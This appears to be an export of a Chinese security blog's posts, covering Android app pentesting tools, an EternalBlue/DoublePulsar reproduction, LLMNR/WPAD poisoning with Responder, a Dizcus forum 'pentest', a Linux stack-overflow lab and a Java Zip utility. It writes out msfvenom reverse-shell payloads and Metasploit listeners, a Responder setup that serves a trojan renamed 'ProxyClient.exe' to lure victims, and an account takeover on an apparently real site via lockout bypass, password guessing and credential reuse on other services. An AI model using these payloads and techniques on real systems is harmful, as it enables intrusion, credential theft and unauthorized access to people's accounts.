其他用法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455Dex是Android系统中可以在Dalvik虚拟机上直接运行的文件格式。java源代码经过ADT的复杂编译后转换成Dex文件，这是一个逐步优化的过程。Dex文件的指$ run 令码就是Dalvik虚拟机专有的一套指令集，专门为嵌入式系统优化过，相比标准jav// a的.class文件，它体积小，运行效率高。$ run app.activity.forintent // Find activities that can handle the given intent $ run app.activity.info // Gets information about exported activities. $ run app.activity.start // Start an Activity $ run app.broadcast.info // Get information about broadcast receivers $ run app.broadcast.send // Send broadcast using an intent $ run app.broadcast.sniff // Register a broadcast receiver that can sniff particular intents $ run app.package.attacksurface // Get attack surface of package $ run app.package.backup // Lists packages that use the backup API (returns true on FLAG_ALLOW_BACKUP) $ run app.package.debuggable // Find debuggable packages $ run app.package.info // Get information about installed packages $ run app.package.launchintent // Get launch intent of package $ run app.package.list // List Packages $ run app.package.manifest // Get AndroidManifest.xml of package $ run app.package.native // Find Native libraries embedded in the application. $ run app.package.shareduid // Look for packages with shared UIDs $ run app.provider.columns // List columns in content provider $ run app.provider.delete // Delete from a content provider $ run app.provider.download // Download a file from a content provider that supports files $ run app.provider.finduri // Find referenced content URIs in a package $ run app.provider.info // Get information about exported content providers $ run app.provider.insert // Insert into a Content Provider $ run app.provider.query // Query a content provider $ run app.provider.read // Read from a content provider that supports files $ run app.provider.update // Update a record in a content provider $ run app.service.info // Get information about exported services $ run app.service.send // Send a Message to a service, and display the reply $ run app.service.start // Start Service $ run app.service.stop // Stop Service $ run auxiliary.webcontentresolver // Start a web service interface to content providers. $ run exploit.jdwp.check // Open @jdwp-control and see which apps connect $ run exploit.pilfer.general.apnprovider // Reads APN content provider $ run exploit.pilfer.general.settingsprovider // Reads Settings content provider $ run information.datetime // Print Date/Time $ run information.deviceinfo // Get verbose device information $ run information.permissions // Get a list of all permissions used by packages on the device $ run scanner.activity.browsable // Get all BROWSABLE activities that can be invoked from the web browser $ run scanner.misc.native // Find native components included in packages $ run scanner.misc.readablefiles // Find world-readable files in the given folder $ run scanner.misc.secretcodes // Search for secret codes that can be used from the dialer $ run scanner.misc.sflagbinaries // Find suid/sgid binaries in the given folder (default is /system). $ run scanner.misc.writablefiles // Find world-writable files in the given folder $ run scanner.provider.finduris // Search for content providers that can be queried from our context. $ run scanner.provider.injection // Test content providers for SQL injection vulnerabilities. $ run scanner.provider.sqltables // Find tables accessible through SQL injection vulnerabilities. $ run scanner.provider.traversal // Test content providers for basic directory traversal vulnerabilities. $ run shell.exec // Execute a single Linux command. $ run shell.send // Send an ASH shell to a remote listener. $ run shell.start // Enter into an interactive Linux shell. $ run tools.file.download // Download a File $ run tools.file.md5sum // Get md5 Checksum of file $ run tools.file.size // Get size of file $ run tools.file.upload // Upload a File $ run tools.setup.busybox // Install Busybox. $ run tools.setup.minimalsu // Prepare 'minimal-su' binary installation on the device. androguardandroguard (Android guard) 是 Android 应用程序的逆向工程，提供恶意软件分析等等功能，androguard 主要由 Python 编写。 androguard 主要有以下功能： 1234567androrisk.py // 该模块用于分析apk危险级别androapkinfo.py // 该模块分析apk列出其中的文件类型、权限、4大组件、是否NDK反射等信息androaxml.py // 该模块用于展示apk androidmanifest.xmlandrogexf.py // 该模块生成函数调用图apkviewer.py // 该模块生成指令级别的调用图androlyze.py // 该模块为交互分析环境androdiff.py // 分析2个apk的不同之处,检测app是否遭到修改 androapkinfo.py该模块分析apk列出其中的文件类型、权限、4大组件、是否NDK反射等信息 1$ python androapkinfo.py -i app-release.apk androlyze.py该模块为交互分析环境 1$ python androlyze.py -i app-release.apk -x 123$ python androlyze.py -s$ a,d,dx = AnalyzeAPK("Desktop/app-release.apk")$ print a,d,dx 12$ d,dx = AnalyzeDex("Desktop/classes.dex")$ print d,dx 等等，可以使用tab键 androdd.py查看apk文件结构 按照指定格式显示androidapk的所有类和子方法的信息流 1$ python androdd.py -i app-release.apk -o out -f png androgexf.pyandrogexf.py 将方法信息之间的连接状态转换成gexf格式 1$ androgexf.py -i app-release.apk -o apk.gexf androdiff.pyandrodiff.py 分析2个apk的不同之处,检测app是否遭到修改 1$ python androdiff.py -i app-release1.apk app-release2.apk 工具集一、santoku 操作系统 santoku 实质是一款定制的 Ubuntu 12.04 系统镜像，类似于KALI，与其它Ubuntu系统相比，它具有如下特点： 1.集成了大量主流的Android程序分析工具，为分析人员节省分析环境配置所需的时间。2.集成移动设备取证工具。支持Android、IPhone 等移动设备的取证工作。3.集成渗透测试工具。4.集成网络数据分析工具。在分析 Android病毒、木马等程序时，这些工具特别有用。5.采用 LXDE 作为系统的桌面环境，界面与 Windows XP非常相似，符合中国人使用习惯。6.正处于beta 阶段，但整个项目显得很有活力，相信将来的更新和维护也会不错。 二、APKIDE APKIDE这是一个大佬们集成的一个APK的测试工具集，包含了常用的大部分工具，例如adb、apktool等。 基础操作签名前面介绍过，META-INF这个文件主要与签名、证书有关。 对APP进行签名一、删除apk中的META-INF文件夹，然后重新zip压缩成apk二、创建密钥存储器（已经有的可以跳过） 1$ keytool -genkey -v -keystore 【keystore名称】 -alias 【密钥别名】 -keyalg RSA -keysize 2048 -validity 【有效天数】 三、使用密钥存储器对app进行签名 1$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore 【keystore名称】 【apk文件】 【密钥别名】 签名成功后会重新出现META-INF文件夹 查看APP的签名解压APK文件，使用JDK的keytool来查看META-INF/CERT.RSA文件内容 1$ keytool -printcert -file 【证书】 验证APP的签名1$ jarsigner -verify -verbose 【apk存放路径】 查看AndroidManifest.xml文件1$ java -jar apktool.jar d -f s 【APK地址】 静态调试一、将apk文件转化为jar文件 1$ dex-jar.bat 【apk】 二、jd-gui.exe 可反编译jar文件 动态调试一、将apk转换成smali代码 1$ java -jar apktool.jar d 【APK地址】 -o out 二、修改AndroidManifest.xml中的Android:debuggable=”true” 三、在入口处添加waitForDebugger代码进行调试等待 这里说的入口处，就是程序启动的地方，就是我们一般的入口Activity，查找这个Activity的话，方法太多了，比如我们这里直接从上面得到的AndroidManifest.xml中找到，因为入口Activity的action和category是固定的。 找到入口Activity之后，我们直接在他的onCreate方法的第一行加上waitForDebugger代码即可，找到对应的MainActivity的smali源码：然后添加一行代码： 1invoke-static &#123;&#125;, Landroid/os/Debug;-&gt;waitForDebugger()V // 相当于java的 android.os.Debug.waitForDebugger(); 四、将smali 转换成apk 1$ java -jar apktool.jar b 【路径】 【目标路径】 五、重新签名 1$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore 【keystore名称】 【apk文件】 【密钥别名】 六、安装apk 1$ adb install 【apk】 七、android studio 导入此项目，需要配置gradle，可参考文章 路径一般为 home\.gradle\wrapper\dists\gradle-x.x-all\xxxxxxxxxxxxx\gradle-x.x 八、配置android studio调试配置，Run-&gt;Edit configurations，点击+号，新建remote类型调试器，设置Name， 修改端口号，可以选择被占用的任意端口，本次设置为62002 九、运行指定的Activity 1$ adb shell am start -D -n com.zjhcsoft.android.eip/.MainActivity 十、查找相应的apk进程 1$ adb shell ps | findstr eip 十一、设置端口转发 1$ adb forward tcp:62002 jdwp:17304 这条命令的含义可以认为是在本地62002端口与手机17304进程之间建立一条通道，当开始调试时，AS连接本地的8800端口，通过这条通道控制程序的运行 十二、设置断点 十三、调试 run-&gt;debug选择刚才新增的调试器，此时程序会断在设置的断点的行，调试器解密如下 渗透测试中注意的点废话不说，直接上图好了。 总结毕竟还只是刚入门，学的时间也不是很久，就先总结到这，之后在进行渗透测试方面的练习以及案例的补充。]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 Equation Group 0day Tools]]></title>
    <url>%2F2017%2F04%2F22%2Fequation-group-0day-2017%2F</url>
    <content type="text"><![CDATA[概述Shadow Brokers黑客组织上周泄露了NSA方程式组织的一些工具，其中某些工具客直接拿下Windows服务器 。 工具包安装 下载安装 python-2.6.6.msi ,pywin32-221.win32-py2.6.exe 。 下载解压 shadowbroker 。 在 shadowbroker 的 windows 目录下新建 listeningposts 目录。 工具包简介 swift 银行攻击的证据 oddjob 植入后门等相关文档 windows 包含了各种漏洞利用工具 最主要还是Windows目录，其包含了各种漏洞利用工具，在exploits中包含了丰富的漏洞利用工具，可影响windows多个平台。 Exploits包含了很多漏洞利用工具，经过大佬们的初步梳理，重点关注对win server有影响的几个工具。 Tools Service Port Describe Explodingcan IIS IIS漏洞利用工具，只对Windows 2003有影响 Eternalromance 139和445 MS17-010 SMB 和 NBT漏洞利用工具 Emphasismine 143 通过ICMP漏洞工具 Englishmansdentist SMTP(25) 通过SMTP漏洞工具 Erraticgopher RPC(445) 通过RPC漏洞工具 Eskimoroll 88 MS14-068 漏洞利用工具，通过kerberos入侵 Eclipsedwing SMB(445) MS08-67 漏洞利用工具 Educatedscholar SMB(445) MS09-050 漏洞利用工具 Emeraldthread 139和445 MS10-061 MB和 Netbios 漏洞利用工具 Zippybeer SMB(445) SMTP漏洞利用工具 Eternalsynergy SMB(445) MS17-010 SMB漏洞利用工具 Esteemaudit RDP(3389) RDP漏洞利用工具 FUZZBUNCH是一个类似 MSF的漏洞利用平台工具，python编写。 Specials Tools Service Port Describe ETERNALBLUE SMB(445) SMB漏洞利用工具，xp、2003、2008、7均有部分覆盖(MS17-010) ETERNALCHAMPION SMB(445) SMB漏洞利用工具，xp、2003、2008、7均有部分覆盖(CVE-2017-0146/0147) ETERNALBLUE实验环境攻击机1 win7 64 旗舰版 python-2.6.6.msi pywin32-221.win32-py2.6.exe shadowbroker IP : 192.168.111.155 攻击机2 kali 2016.2 IP : 192.168.111.144 靶机 win2008 IP : 192.168.111.158 systeminfo 信息如下： 复现过程初始化配置，创建一个攻击项目。 使用 ETERNALBLUE 模块。 使用 DoublePulsar 模块。 DoublePulsar是一个后门程序，用于在已感染的系统上注入和运行恶意代码。这是一种NSA用作监听使用的后门程序，如今在GitHub上得到免费发布后，任何人均可使用。其软件是在Windows XP到Server 2008 R2系统版本中的计算机上，通过使用EternalBlue Exploit的SMB文件共享服务端口启动旧版本下的远程执行代码RCE，随后进行程序的安装。也就是说，会受到攻击影响的计算机系统是存在漏洞的Windows版本，因为这给攻击者提供了其SMB端口。 这里要选择SMB和对应的目标操作系统位数下面的话是攻击的4个操作 选择RunDLL。 这里用攻击机2 kali的msfvenom 生成一下dll 这里使用的是reverse_tcp的paylaod 可以根据网络情况采用其他payload 1$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.111.144 LPORT=5555 -f dll &gt; s.dll 把生成的s.dll传到攻击机1上去， 然后kali开启msfconsole 监听，下面的payload要和上面msfvenom的payload对应起来 123456$ msfconsole msf &gt; use exploit/multi/handler msf &gt; set LHOST 192.168.111.144 msf &gt; set LPORT 5555 msf &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp msf &gt; exploit 然后操作fb.py ，加载s.dll。 kali 收到反弹的shell 。 总结当然，还有其他的攻击模块，下次继续更新。 为了平时的渗透测试的方便，我临时写了个检测的脚本（测试版）,供大家测试使用。 参考ShadowBrokers方程式工具包浅析，揭秘方程式组织工具包的前世今生方程式 0day ETERNALBLUE 复现过程]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>code execution</tag>
        <tag>equation group</tag>
        <tag>eternalBlue</tag>
        <tag>doublePulsar</tag>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中间人攻击——LLMNR、WPAD以及Responder]]></title>
    <url>%2F2017%2F04%2F09%2Fspoof-llmnr-wpad%2F</url>
    <content type="text"><![CDATA[概述继续学习一波中间人攻击的LLMNR、WPAD以及Responder，备忘。 概述Windows系列机子在局域网中查询DNS一般通过如下的几个步骤： 查看本地hosts文件。 1type C:\Windows\system32\drivers\etc\hosts 查询本地DNS缓存。 1ipconfig/displaydns 向dns服务器发送dns请求。 如果本地网络中的dns也解析失败,它就会被交给LLMNR[链路本地多播名称解析]和netbios-ns去处理解析。 LLMNR 以及 NetBIOS——NS从 Windows Vista 起，Windows 操作系统开始支持一种新的名称解析协议 —— LLMNR，主要用于局域网中的名称解析。在DNS 服务器不可用时，DNS 客户端计算机可以使用本地链路多播名称解析 (LLMNR—Link-Local Multicast Name Resolution)（也称为多播 DNS 或 mDNS）来解析本地网段上的名称。例如，如果路由器出现故障，从网络上的所有 DNS 服务器切断了子网，则支持 LLMNR 的子网上的客户端可以继续在对等基础上解析名称，直到网络连接还原为止。 LLMNR为使用IPv4、IPv6或者同时使用这两种地址的设备提供了点对点名称解析服务，LLMNR 能够很好的支持 IPv4 和 IPv6，因此在 Windows 名称解析顺序中是一个仅次于 DNS 的名称解析方式，更重要的是在 Linux 操作系统中也实现了 LLMNR。 LLMNR通过在DNS名称解析服务不可用时提供解析服务，弥补了DNS的不足。 LLMNR 和DNS一样，LLMNR 名称解析过程所使用的传输协议为 UDP 协议。其IPv4 的广播地址为 - 224.0.0.252, IPv6 的广播地址为 - FF02:0:0:0:0:0:1:3 或 FF02::1:3。在主机中所监听的端口为 UDP/5355。 使用 Wireshark 抓取一个完整的 LLMNR 质询/应答过程的数据包，如下图所示： 从上图可以看到，主机 A 分别使用自己的 IPv4 地址和 IPv6 地址向 IPv4 和 IPv6 的广播地址进行了广播。查询的地址类型为请求主机 B 的 IPv4 地址，这一点可以从 A 或 AAAA 进行区别。一个 A 表示请求的地址类型为 IPv4 地址，四个A（AAAA）表示请求的地址类型为 IPv6 地址。 NetbiosNetbios 即名称服务,专门用于同一内网下windows机器之间通过机器名相互访问,工作在会话层。NetBIOS是本地网络的系统API，它有三种NetBIOS服务： 域名服务，使用137端口用于域名注册和域名解析 数据分发服务，使用138端口连接通信 会话服务，使用139端口面向连接通信 在dns查询失败后，LLMNR会调用NetBIOS，生成一个NetBIOS-NS数据包然后使用广播的方式发送出去。 这个看似没什么坏处的协议，我们可以利用其进行中间人攻击从而获取敏感数据，如用户名，hash等。 劫持会话获取 HASH 劫持 SMB 会话获取 HASH 利用 LLMNR Poison 攻击劫持 SMB 会话与 SMBRelay 攻击相似，本质上都是对 SMB 的会话进行劫持，但是 SMBRelay 攻击是被动式的攻击，同时，攻击者所劫持的 SMB 会话只有在该会话本身是一次成功的会话的情况下才能拿到目标服务器的权限。利用 LLMNR Poison 攻击劫持 SMB 会话，只要有主机使用计算机名称访问其他主机的共享时就可以得到发起共享请求的主机的 HASH。但是这个 HASH 只能用于爆破（因为已知了挑战），无法直接登录主机。可以将 LLMNR Poison 攻击 与 SMBRelay 攻击结合起来，提升攻击力。 使用 HTTP 401 认证获取 HASH 使用 HTTP 401 认证同样也可以获取到客户端机器的 HASH。 攻击原理假设现在有三台机器： A 被欺骗主机： 192.168.111.170B 攻击机：192.168.111.183C 被欺骗主机要访问的服务器：192.168.111.1 当A向C发起共享资源请求时,由于本地dns解析失败,正常情况下该请求会被交给LLMNR然后执行netbios查询,但不巧的是攻击者此时正在监听网络中的所有netbios查询请求,自然也就会捕捉到这条查询,当攻击者捕捉到该查询之后,它会告请求者也就是A,我[B]就是你要请求的那台服务器,接着A会把自己的账号密码提供给B认证,也就是说,此时B已经截获到了A的账号密码。 具体操作 在C服务器上,也就是我们的服务器上先创建一个共享目录： 攻击机启动responder 此时,我们再利用responder 来获取目标的smb hash,虽然不是明文,但我们可以配合类似hashcat的hash破解工具尝试破解该hash,当然,如果你有自己的GPU矩阵就再好不过了,或许很快就可以拿到对应的明文 1root@kali:~# responder -I eth0 然后再回到A上通过smb进行访问： Kali 攻击机上可以看到如下hash值 WPADWPAD（web代理自动发现协议-Web Proxy Auto-Discovery Protocol），是客户端通过DHCP或DNS协议探测代理服务器配置脚本url的一种方式。当IE定位脚本并将脚本下载到本地之后，就可以通过该脚本来为不同的url选择相应的代理服务器。目前主流浏览器一般都支持WPAD。 只要应用于如下场景，公司内网为了安全，不允许员工直接访问外网的服务，但是允许公司员工通过web代理访问外网资源，但是对于员工来说设置代理又是个麻烦事，所以通常公司主要使用用WPAD来查找网络中的wpad.dat文件的,有了该文件以后,客户端以后就会根据文件中的内容自动配置代理。 查询wpad.dat文件主要通过如下几个方式： 通过dns查询。 通过dhcp服务进行检索。 利用LLMNR查询。 攻击原理可以利用dns或者dhcp毒化,来操控流量指向,但这种方式很容易被拦截,而LLMNR则不一样,它是通过广播告诉同一内网下的所有windows,它就是wpad服务器,这样当你的浏览器设置为自动检测代理设置的情况下,它就会下载攻击者事先准备好的wpad.dat文件,这样一来,客户端的流量就会经过攻击者的机器。 假设现在有三台机器： A 被欺骗主机： 192.168.111.170B 攻击机：192.168.111.183C 被欺骗主机要访问的服务器：192.168.111.184 具体操作 在C服务器上,也就是我们的服务器上先创建一个共享目录： 攻击机启动responder 1root@kali:~# responder -I eth0 -wFb 在被欺骗主机上开启自动检测脚本 被欺骗者访问主机目标服务器，并登陆 Kali 攻击机上可以看到如下明文密码 其他Responder 结合钓鱼页面/跨站进行伪造钓鱼页面或者借助跨站插入如下相关请求， 12&lt;img/src=\\WIN764TEST1\1.jpg width=0 height=0&gt; &lt;img/src=http:\\WIN764TEST1\1.jpg width=0 height=0&gt; 如果受害者进行了账号密码输入，那么就能得到相应的信息，比如hash值或者明文密码等。 responder 钓鱼木马 首先,准备好自己的马,这里我就暂时直接用msf来生成了，现实中免杀是必须的,生成好以后把它放到我们的responder的files目录中， 12root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.111.183 LPORT=1234 -f exe -o /root/Desktop/shell.exeroot@kali:~# mv /root/Desktop/shell.exe /usr/share/responder/files/ msf监听端口 12345use exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.111.183 set LPORT 1234exploit -j 编辑responder.conf 1root@kali:~# vi /etc/responder/Responder.conf 12345Serve-Always = OnServe-Exe = On HtmlFilename = files/AccessDenied.htmlExeFilename = files/shell.exe 指定我们刚刚生成的shell名称ExeDownloadName = ProxyClient.exe 提示下载时所显示的名称,最好弄个成功率比较高的有诱惑性的名字 启动responder： 1root@kali:~# responder -I eth0 -wrf 等待被欺骗机访问任意域名，下载运行程序 kali成功控制。 参考文章利用LLMNR协议进行常规win内网渗透的理解与实践利用 LLMNR 名称解析缺陷劫持内网指定主机会话]]></content>
      <categories>
        <category>spoof</category>
      </categories>
      <tags>
        <tag>dnsspoof</tag>
        <tag>llmnr</tag>
        <tag>responder</tag>
        <tag>wpad</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dizcus Pentest]]></title>
    <url>%2F2017%2F04%2F04%2Fdizcus-pentest%2F</url>
    <content type="text"><![CDATA[概述某次看大佬们聊天时聊到某个站，于是赶紧上去看看。 过程看看下这个站，并没找到什么能getshell的办法，好气啊。只能想想其他思路了。偶然发现可以查看其他人的个人资料以及交的会员费等详情。于是搞了个python脚本爬了下所有交了会员费的用户。 发现用户登录的地方没有验证码限制，但是有登陆错误次数限制。 可以确定这个网站用户登录的地方的登陆限制是通过IP和用户名一起的，意思是同一个ip或者同一个用户只能错误登陆5次，之后便锁定了。 IP可以用X-Forwarded-For绕过，但是用户名没办法。 既然这样的话，那就试下用户名和密码一样的吧，看看这样能不能得到一些信息。 由于之前爬下来的账户显示的是昵称，假如没有昵称就显示用户名，这里刚好可以利用这点进行BurpSuite爆破。 OK，发现还是得到了一些用户的信息，试了下，可以登录，发现还不少。 当然，登陆之后还能看到用户邮箱的一些信息，进行了一下社工，部分账号可以登录12306等网站。 后来发现这种方式可以针对大部分的dizcus进行利用。 总结技术还是有所欠缺，还是得继续学习。]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>pentest</tag>
        <tag>python</tag>
        <tag>dizcus</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 溢出]]></title>
    <url>%2F2017%2F03%2F11%2Flinux-overflow%2F</url>
    <content type="text"><![CDATA[概述Linux下的溢出学习。 目标代码12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; const char pass[] = "IloveIS2013@ZJGSU"; /* Password */ void authorized()&#123; printf( "You have been authorized!\n" );&#125; void getInput()&#123; char buffer[20]; gets( buffer ); if ( strcmp( pass, buffer ) == 0 ) &#123; authorized(); &#125; else printf("Your password is wrong!\n");&#125; int main()&#123; getInput(); return(0);&#125; 代码很简单，用户输入一个密码，然后程序把它加密起来，并且和程序中存储的密码对比，如果成功了，就调用authorized()函数，就当这个authorized()函数是用来让用户在登录后干一些敏感操作的好了。 1gcc -ggdb -fno-stack-protector -z execstack overflow.c -lcrypt -o overflow 步骤 程序分配20字节的缓冲区，然后把用户输入存储到这个缓冲区里面，然后调用函数把它加密，再和程序里的密码对比。 我们编译的时候会被编译器提示gets()不安全，事实上也是，因为它并没有做任何边界检查，所以我们就用它来调用漏洞了。 我们用objdump来dump一下生成的机器码，看看这儿它做了什么objdump -d -M intel overflow 现在我们所有要做的就是把getInput的返回地址覆盖为0x0000000000400636，而且我们可以做到。我们可 以在shell里用printf把数据传给程序，你可以用\x来转意16进制数据，因为地址是倒着来的（注：小端），所以我们也倒着给它就好了。还有，我 们需要用0x00来终止我们的缓存，这样strcmp就不会在我们函数返回之前引起一个段错误。printf的结果如下： 我们可以知道authorized()函数事实上已经执行成功了。]]></content>
      <categories>
        <category>overflow</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>overflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java Zip]]></title>
    <url>%2F2017%2F03%2F10%2Fjava-zip%2F</url>
    <content type="text"><![CDATA[概述由于最近毕业设计的需要，需要使用到Zip的解压、压缩功能，还要有能加密解密，所以去找了相关的Java zip的包，封装了下。 需要Java Zip 解压、压缩的功能，需要用到zip4j这个jar文件，当然，我使用maven直接下载的。 在pom.xml里直接添加如下代码就好了： 12345&lt;dependency&gt; &lt;groupId&gt;net.lingala.zip4j&lt;/groupId&gt; &lt;artifactId&gt;zip4j&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt;&lt;/dependency&gt; 代码好了，直接上代码：package com.orleven.tentacle.util;import java.io.File;import java.util.ArrayList;import java.util.List;import net.lingala.zip4j.core.ZipFile;import net.lingala.zip4j.exception.ZipException;import net.lingala.zip4j.model.FileHeader;import net.lingala.zip4j.model.ZipParameters;import net.lingala.zip4j.util.Zip4jConstants;/** * Zip 处理工具包 * 需要注意的是如果压缩包里已经存在要添加的文件，会陷入死循环，所以添加之前要先判断一下。 * @author orleven * @date 2017年3月8日 */public class ZipUtil &#123; /** * 添加文件夹到zip中 * @param inPath * @param outPath * @param password * @return */ public static boolean addFoldInZip(String inPath,String storagePath,String outPath,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(outPath); ZipParameters parameters = new ZipParameters(); parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE); parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL); parameters.setRootFolderInZip(storagePath); ; if(password!=null&amp;&amp;!password.equals(""))&#123; parameters.setEncryptFiles(true); parameters.setEncryptionMethod(Zip4jConstants.ENC_METHOD_AES); parameters.setAesKeyStrength(Zip4jConstants.AES_STRENGTH_256); parameters.setPassword(password); &#125; zipFile.addFolder(inPath, parameters); return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 添加文件到zip中指定的文件夹中 * @param inPath * @param storagePath * @param outPath * @param password * @return */ public static boolean addFileInZip(String inPath,String storagePath,String outPath,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(outPath); File inFile = new File(inPath); ZipParameters parameters = new ZipParameters(); parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE); // set compression method to deflate compression parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL); parameters.setRootFolderInZip(storagePath); if(password!=null&amp;&amp;!password.equals(""))&#123; parameters.setEncryptFiles(true); parameters.setEncryptionMethod(Zip4jConstants.ENC_METHOD_AES); parameters.setAesKeyStrength(Zip4jConstants.AES_STRENGTH_256); parameters.setPassword(password); &#125; zipFile.addFile(inFile, parameters); return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 添加多个文件到zip中指定的文件夹中 * @param inPath * @param storagePath * @param outPath * @param password * @return */ public static boolean addFilesInZip(ArrayList&lt;File&gt; inFiles,String storagePath,String outPath,String password) &#123; try &#123; ArrayList filesToAdd = new ArrayList(); ZipFile zipFile = new ZipFile(outPath); ZipParameters parameters = new ZipParameters(); parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE); // set compression method to deflate compression parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL); parameters.setRootFolderInZip(storagePath); if(password!=null&amp;&amp;!password.equals(""))&#123; parameters.setEncryptFiles(true); parameters.setEncryptionMethod(Zip4jConstants.ENC_METHOD_AES); parameters.setAesKeyStrength(Zip4jConstants.AES_STRENGTH_256); parameters.setPassword(password); &#125; zipFile.addFiles(inFiles, parameters); return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 从zip中删除文件 * @param inPath * @param outPath * @param password * @return */ public static boolean removeFileInZip(String inPath,String storagePath,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(inPath); if (zipFile.isEncrypted()) &#123; zipFile.setPassword(password); &#125; List fileHeaderList = zipFile.getFileHeaders(); storagePath = storagePath.replaceAll("\\\\", "/"); for (int i =fileHeaderList.size() -1; i&gt;0 ; i--) &#123; FileHeader fileHeader = (FileHeader)fileHeaderList.get(i); if(fileHeader.getFileName().indexOf(storagePath)==0)&#123; System.out.println("Name: " + fileHeader.getFileName()); zipFile.removeFile(fileHeader.getFileName()); &#125; &#125; return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 查看压缩包的文件列表 * @param inPath * @param password * @return */ public static boolean getNameFromZip(String inPath,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(inPath); if (zipFile.isEncrypted()) &#123; zipFile.setPassword(password); &#125; List fileHeaderList = zipFile.getFileHeaders(); for (int i = 0; i &lt; fileHeaderList.size(); i++) &#123; FileHeader fileHeader = (FileHeader)fileHeaderList.get(i); System.out.println("Name: " + fileHeader.getFileName()); System.out.println("Compressed Size: " + fileHeader.getCompressedSize()); System.out.println("Uncompressed Size: " + fileHeader.getUncompressedSize()); System.out.println("CRC: " + fileHeader.getCrc32()); System.out.println("************************************************************"); &#125; return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 解压zip里的所有文件 * @param inPath * @param outPath * @param password * @return */ public static boolean extractZip(String inPath,String outPath ,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(inPath); if (zipFile.isEncrypted()) &#123; zipFile.setPassword(password); &#125; zipFile.extractAll(outPath); System.out.println(password); return true; &#125; catch (ZipException e) &#123;// e.printStackTrace(); return false; &#125; &#125; /** * 解压zip里的文件 * @param inPath * @param storagePath * @param outPath * @param password * @return */ public static boolean extractFileFromZip(String inPath,String storagePath,String outPath ,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(inPath); if (zipFile.isEncrypted()) &#123; zipFile.setPassword(password); &#125; List fileHeaderList = zipFile.getFileHeaders(); storagePath = storagePath.replaceAll("\\\\", "/"); for (int i =0;i&lt;fileHeaderList.size() ;i++) &#123; FileHeader fileHeader = (FileHeader)fileHeaderList.get(i); if(fileHeader.getFileName().indexOf(storagePath)==0)&#123; zipFile.extractFile(fileHeader, outPath); zipFile.removeFile(fileHeader.getFileName()); &#125; &#125; return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 测试zip 压缩算法 */ public static void main(String[] args) &#123; System.out.println("Zip压缩／解压缩测试"); // System.out.println("添加文件夹压缩文件"); // String inPath = "C:\\Users\\dell\\Desktop\\测试文件"; // String outPath = "C:\\Users\\dell\\Desktop\\test.zip";// String storagePath = null;// String password = "123456";// ZipUtil.addFoldInZip(inPath, storagePath,outPath,password); // System.out.println("添加文件到压缩文件"); // String inPath1 = "C:\\Users\\dell\\Desktop\\IEEE_TPDS2003.docx"; // String outPath1 = "C:\\Users\\dell\\Desktop\\test.zip";// String storagePath1 = null;// String password1 = "";// ZipUtil.addFileInZip(inPath1, storagePath1,outPath1,password1); // System.out.println("删除zip的某个文件"); // String storagePath2 = "测试文件\\毕业论文模板201435"; // String inPath2 = "C:\\Users\\dell\\Desktop\\test.zip";// String password2 = "123456";// ZipUtil.removeFileInZip(inPath2, storagePath2, password2); // System.out.println("查看zip文件中的内容"); // String inPath3 = "C:\\Users\\dell\\Desktop\\test.zip"; // String password3 = "123456";// ZipUtil.getNameFromZip(inPath3,password3); // System.out.println("解压压缩文件"); // String inPath4 = "C:\\Users\\dell\\Desktop\\www.zip"; // String outPath4 = "C:\\Users\\dell\\Desktop\\"; // String password4 = "123456";// ZipUtil.extractZip(inPath4, outPath4, password4); // System.out.println("解压zip中的某个文件"); // String inPath5 = "C:\\Users\\dell\\Desktop\\test.zip"; // String outPath5 = "C:\\Users\\dell\\Desktop\\"; // String password5 = "123456";// String storagePath5 = "测试文件\\毕业论文模板201435";// ZipUtil.extractFileFromZip(inPath5, storagePath5, outPath5, password5); System.out.println("已经输出！"); &#125;&#125;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>zip</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中间人攻击——ARP毒化与DNS毒化]]></title>
    <url>%2F2017%2F02%2F28%2Farpspoof-dnsspoof%2F</url>
